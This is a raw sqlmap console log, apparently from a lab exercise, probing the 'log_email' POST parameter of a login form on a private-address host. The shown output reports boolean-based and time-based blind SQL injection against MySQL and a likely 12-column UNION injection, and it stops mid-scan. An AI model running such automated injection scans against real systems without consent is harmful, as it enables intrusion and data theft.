        ___
       __H__
 ___ ___[']_____ ___ ___  {1.5.7#stable}
|_ -| . [(]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 16:15:21 /2021-08-06/

[16:15:21] [INFO] parsing HTTP request from 'loginRequest.txt'
[16:15:21] [INFO] testing connection to the target URL
got a 302 redirect to 'http://10.10.223.100:80/index.php'. Do you want to follow? [Y/n] [16:15:42] [INFO] testing if the target URL content is stable
[16:15:43] [WARNING] POST parameter 'log_email' does not appear to be dynamic
[16:15:44] [WARNING] heuristic (basic) test shows that POST parameter 'log_email' might not be injectable
[16:15:45] [INFO] heuristic (XSS) test shows that POST parameter 'log_email' might be vulnerable to cross-site scripting (XSS) attacks
[16:15:45] [INFO] testing for SQL injection on POST parameter 'log_email'
[16:15:45] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[16:15:46] [WARNING] reflective value(s) found and filtering out
[16:15:52] [INFO] POST parameter 'log_email' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable 
[16:16:04] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'MySQL' 
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] [16:16:39] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[16:16:39] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[16:16:39] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[16:16:40] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[16:16:41] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[16:16:42] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
[16:16:43] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[16:16:44] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[16:16:45] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[16:16:45] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[16:16:46] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[16:16:47] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[16:16:47] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[16:16:47] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[16:16:48] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[16:16:49] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)'
[16:16:49] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)'
[16:16:51] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'
[16:16:51] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)'
[16:16:51] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (EXP)'
[16:16:51] [INFO] testing 'MySQL >= 5.6 error-based - Parameter replace (GTID_SUBSET)'
[16:16:51] [INFO] testing 'MySQL >= 5.7.8 error-based - Parameter replace (JSON_KEYS)'
[16:16:51] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
[16:16:51] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)'
[16:16:51] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'
[16:16:51] [INFO] testing 'Generic inline queries'
[16:16:52] [INFO] testing 'MySQL inline queries'
[16:16:53] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[16:16:53] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[16:16:53] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[16:16:54] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[16:16:55] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query - comment)'
[16:16:55] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query)'
[16:16:56] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[16:17:18] [INFO] POST parameter 'log_email' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[16:17:18] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[16:17:18] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[16:17:20] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[16:17:25] [INFO] target URL appears to have 12 columns in query
injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] [16:18:34] [WARNING] if UNION based SQL injection is not detected, please consider usage of option '--union-char' (e.g. '--union-char=1') and/or try to force the back-end DBMS (e.g. '--dbms=mysql') 
[16:18:48] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
[16:19:03] [INFO] testing 'MySQL UNION query (random number) - 1 to 20 columns'
[16:19:18] [INFO] target URL appears to be UNION injectable with 12 columns
[16:19:49] [WARNING] if UNION based SQL injection is not detected, please consider and/or try to force the back-end DBMS (e.g. '--dbms=mysql') 
[16:19:49] [INFO] testing 'MySQL UNION query (NULL) - 21 to 40 columns'
[16:20:03] [INFO] testing 'MySQL UNION query (random number) - 21 to 40 columns'
[16:20:15] [INFO] testing 'MySQL UNION query (NULL) - 41 to 60 columns'
[16:20:31] [INFO] testing 'MySQL UNION query (random number) - 41 to 60 columns'
[16:20:47] [INFO] testing 'MySQL UNION query (NULL) - 61 to 80 columns'
[16:21:02] [INFO] testing 'MySQL UNION query (random number) - 61 to 80 columns'
[16:21:23] [INFO] testing 'MySQL UNION query (NULL) - 81 to 100 columns'
